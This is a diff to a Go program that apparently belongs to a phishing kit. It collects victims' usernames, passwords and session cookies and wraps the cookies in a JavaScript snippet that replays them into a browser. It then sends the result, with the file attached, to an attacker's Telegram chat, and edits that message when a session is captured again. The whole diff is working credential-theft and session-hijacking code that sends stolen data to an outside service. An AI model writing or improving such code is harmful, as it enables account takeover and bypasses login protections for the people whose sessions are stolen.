@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
@@ -26,6 +27,7 @@ type Token struct {
 	StoreID          interface{} `json:"storeId"`
 }
 
+// extractTokens pulls each token from the given nested map and maps it to a Token struct.
 func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 	var tokens []Token
 
@@ -84,6 +86,7 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 	return tokens
 }
 
+// processAllTokens takes multiple JSON strings of cookies, unmarshals them, and consolidates them.
 func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
 	var consolidatedTokens []Token
 
@@ -111,18 +114,32 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 	return consolidatedTokens, nil
 }
 
-// Define a map to store session IDs and a mutex for thread-safe access
-var processedSessions = make(map[string]bool)
-var sessionMessageMap = make(map[string]int)
-var mu sync.Mutex
+// Global concurrency controls
+var (
+	processedSessions = make(map[string]bool)
+	sessionMessageMap = make(map[string]int)
+	mu                sync.Mutex
+)
 
+// generateRandomString returns a 10-char random alphanumeric string.
+func generateRandomString() string {
+	rand.Seed(time.Now().UnixNano())
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	length := 10
+	randomStr := make([]byte, length)
+	for i := range randomStr {
+		randomStr[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(randomStr)
+}
+
+// createTxtFile generates a .txt file with combined cookies in a JS snippet.
 func createTxtFile(session Session) (string, error) {
 	// Create a text file name based on the email and timestamp
 	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
 	safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
-	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS format
+	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS
 	txtFileName := fmt.Sprintf("%s_%s.txt", safeEmail, timestamp)
-
 	txtFilePath := filepath.Join(os.TempDir(), txtFileName)
 
 	// Create a new text file
@@ -132,29 +149,67 @@ func createTxtFile(session Session) (string, error) {
 	}
 	defer txtFile.Close()
 
-	// Marshal tokens into JSON
+	// Marshal the session maps into JSON byte slices
 	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
 	if err != nil {
-		return "", fmt.Errorf("failed to marshal tokens: %v", err)
+		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
+	}
+	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
+	}
+	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
+	}
+	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal Custom: %v", err)
 	}
 
-	// Wrap JSON inside JavaScript function
+	// Combine all token groups into a single slice
+	allTokens, err := processAllTokens(
+		string(tokensJSON),
+		string(httpTokensJSON),
+		string(bodyTokensJSON),
+		string(customJSON),
+	)
+	if err != nil {
+		return "", fmt.Errorf("error processing tokens: %v", err)
+	}
+
+	result, err := json.MarshalIndent(allTokens, "", "  ")
+	if err != nil {
+		fmt.Println("Error marshalling final tokens:", err)
+	}
+
+	fmt.Println("Combined Tokens: ", string(result))
+
+	// Wrap JSON inside a small JavaScript snippet
 	jsWrapper := fmt.Sprintf(`(function(){
-let cookies = JSON.parse('%s');
+let cookies = JSON.parse(`+"`%s`"+`);
 function putCookie(key, value, domain, path, isSecure) {
-        const cookieMaxAge = 'Max-Age=31536000';
-        if (isSecure) {
-                console.log('Setting Cookie', key, value);
-                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
-            } else {
-                console.log('Setting Cookie', key, value);
-                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + ';';
-            }
+    const cookieMaxAge = 'Max-Age=31536000';
+    if (isSecure) {
+        console.log('Setting Cookie', key, value);
+        if (window.location.hostname == domain) {
+            document.cookie = `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=None`;
+        } else {
+            document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None`;
         }
-        for (let cookie of cookies) {
-            putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
+    } else {
+        console.log('Setting Cookie', key, value);
+        if (window.location.hostname == domain) {
+            document.cookie = `${key}=${value};${cookieMaxAge};path=${path};`;
+        } else {
+            document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};`;
         }
-}());`, strings.ReplaceAll(string(tokensJSON), "'", "\\'"))
+    }
+}
+for (let cookie of cookies) {
+    putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
+}
+}());`, string(result))
 
 	// Write the wrapped JavaScript content into the text file
 	_, err = txtFile.WriteString(jsWrapper)
@@ -165,8 +220,8 @@ function putCookie(key, value, domain, path, isSecure) {
 	return txtFilePath, nil
 }
 
+// formatSessionMessage creates the text snippet for Telegram (excluding token data).
 func formatSessionMessage(session Session) string {
-	// Format the session information (no token data in message)
 	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
 		"👤 Username:      🪤 %s\n"+
 		"🔑 Password:      🪤 %s\n"+
@@ -184,6 +239,7 @@ func formatSessionMessage(session Session) string {
 	)
 }
 
+// Notify orchestrates creation of a text file, then sends (or edits) a Telegram notification.
 func Notify(session Session) {
 	config, err := loadConfig()
 	if err != nil {
@@ -194,6 +250,20 @@ func Notify(session Session) {
 	mu.Lock()
 	if processedSessions[string(session.ID)] {
 		mu.Unlock()
+		messageID, exists := sessionMessageMap[string(session.ID)]
+		if exists {
+			txtFilePath, errCreate := createTxtFile(session)
+			if errCreate != nil {
+				fmt.Println("Error creating TXT file for update:", errCreate)
+				return
+			}
+			msgBody := formatSessionMessage(session)
+			errEdit := editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msgBody)
+			if errEdit != nil {
+				fmt.Printf("Error editing message: %v\n", errEdit)
+			}
+			os.Remove(txtFilePath)
+		}
 		return
 	}
 
